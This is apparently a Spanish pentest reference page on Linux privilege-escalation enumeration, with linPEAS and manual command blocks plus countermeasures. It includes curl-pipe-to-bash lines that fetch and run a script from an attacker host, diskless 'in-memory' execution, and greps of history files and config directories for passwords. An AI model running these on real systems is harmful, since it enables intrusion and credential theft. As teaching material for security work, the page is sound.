# Enumeración para Escalada de Privilegios en Linux

## Descripción
La enumeración para escalada de privilegios en Linux es el proceso sistemático de recolectar información del sistema comprometido para identificar vectores que permitan elevar privilegios de un usuario sin permisos a root. Incluye la inspección de permisos SUID/SGID, configuraciones sudo, capabilities, cron jobs, servicios en ejecución, versión del kernel, archivos sensibles accesibles, variables de entorno y configuraciones de red internas. Herramientas automatizadas como linPEAS y linux-exploit-suggester aceleran este proceso al consolidar múltiples verificaciones en una sola ejecución.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1082 (System Information Discovery); T1083 (File and Directory Discovery)
- **Plataforma**: Linux
- **Dificultad**: Básica

## Herramientas
- **linPEAS** (`linpeas.sh`) — script de enumeración integral que identifica vectores de privesc con código de colores por severidad
- **linux-exploit-suggester** — analiza la versión del kernel y sugiere exploits aplicables
- **LinEnum** (`LinEnum.sh`) — script de enumeración de privilegios (alternativa a linPEAS)
- **GTFOBins** (https://gtfobins.github.io/) — base de datos de binarios explotables vía SUID, sudo o capabilities
- **LOLBAS** (https://lolbas-project.github.io/) — equivalente Windows de GTFOBins; linPEAS integra verificaciones de binarios abusables en Linux

## Comandos / Ejemplos

### Ejecución de linPEAS
```bash
# Transferir linPEAS al objetivo
# Opción 1: desde servidor HTTP del atacante
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Opción 2: descargar y ejecutar
wget http://10.10.14.5:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Ejecutar sin tocar disco (ejecución en memoria)
curl http://10.10.14.5:8080/linpeas.sh | bash

# Guardar salida para análisis posterior
./linpeas.sh -a | tee linpeas_output.txt

# Colores de severidad en la salida:
# ROJO/AMARILLO = Vector de privesc altamente probable
# ROJO = Configuración peligrosa detectada
# VERDE = Información de interés
```

### Enumeración manual — información del sistema
```bash
# Información del kernel y distribución
uname -a
cat /etc/os-release
cat /proc/version

# Usuarios y grupos
id
whoami
cat /etc/passwd | grep -v nologin
cat /etc/group

# Usuarios con shell válido
grep -E '/bin/(ba)?sh' /etc/passwd

# Historial de comandos (puede contener contraseñas)
cat ~/.bash_history
cat ~/.zsh_history
```

### Enumeración manual — vectores de privesc
```bash
# Permisos sudo
sudo -l

# Binarios SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l

# Archivos writable interesantes
find / -writable -type f 2>/dev/null | grep -v proc

# Archivos de configuración con credenciales
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | head -20
grep -ri "password" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null
```

### Enumeración manual — red y servicios
```bash
# Conexiones activas y puertos internos
ss -tulnp
netstat -tulnp

# Interfaces de red (para identificar redes internas)
ip addr
ip route

# Procesos en ejecución como root
ps aux | grep root

# Servicios internos que podrían ser explotables
curl http://127.0.0.1:8080 2>/dev/null
```

### Linux-exploit-suggester
```bash
# Ejecutar y obtener CVEs aplicables al kernel
./linux-exploit-suggester.sh

# Especificar versión manualmente
./linux-exploit-suggester.sh -k 4.4.0-21-generic

# Resultado: lista de CVEs con probabilidad de éxito y URLs de exploits
```

## Contramedidas
- Restringir acceso a comandos de enumeración del sistema mediante perfiles AppArmor o SELinux
- Configurar `kernel.dmesg_restrict=1` para limitar acceso a mensajes del kernel
- Establecer `kernel.kptr_restrict=2` para ocultar direcciones del kernel en `/proc/kallsyms`
- Monitorear ejecución de scripts de enumeración conocidos (linpeas, linenum) con reglas de detección
- Deshabilitar historial de comandos para cuentas de servicio: `unset HISTFILE`
- Limitar la información expuesta en `/proc` montándolo con `hidepid=2`

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1082: System Information Discovery. https://attack.mitre.org/techniques/T1082/
- MITRE Corporation. (2024). ATT&CK Technique T1083: File and Directory Discovery. https://attack.mitre.org/techniques/T1083/
- carlospolop. (s.f.). *PEASS-ng* [Software]. GitHub. https://github.com/peass-ng/PEASS-ng
- The-Z-Labs. (s.f.). *linux-exploit-suggester* [Software]. GitHub. https://github.com/The-Z-Labs/linux-exploit-suggester
- GTFOBins. (s.f.). *GTFOBins* [Base de datos]. https://gtfobins.github.io/
- OccupyTheWeb. (2018). *Linux Basics for Hackers*. No Starch Press.
